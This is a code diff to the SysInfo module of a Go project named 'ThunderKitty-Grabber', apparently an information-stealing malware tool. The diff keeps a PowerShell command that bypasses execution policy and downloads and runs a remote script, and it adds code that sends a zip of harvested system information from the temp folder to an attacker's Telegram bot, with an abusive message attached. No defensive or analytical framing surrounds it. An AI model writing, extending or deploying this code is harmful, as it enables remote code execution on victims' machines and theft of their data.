@@ -1,7 +1,10 @@
 package SysInfo
 
 import (
+	requests "ThunderKitty-Grabber/utils/telegramsend"
 	"fmt"
+	"os"
+	"path/filepath"
 	"syscall"
 	"unsafe"
 )
@@ -45,10 +48,18 @@ type PROCESS_INFORMATION struct {
 	Tid     uint32
 }
 
-func Fetch() {
+func Fetch(TelegramBotToken, TelegramChatId string) {
 	err := sysinfo(`powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/EvilBytecode/ThunderKitty/main/powershellstuff/SysInfo.ps1')|iex"`)
 	if err != nil {
 		fmt.Printf("Error executing PowerShell command: %v\n", err)
+	}
+
+	fmt.Println("Sending sysinfo now!!!!!")
+	// Send the system info zip file to the user's Telegram
+	path := filepath.Join(os.TempDir(), "ThunderKitty.zip")
+	err = requests.SendToTelegram(TelegramBotToken, TelegramChatId, "Kilth yourthelf bro", path)
+	if err != nil {
+		fmt.Printf("Error executing Telegram command: %v\n", err)
 	}
 }
 
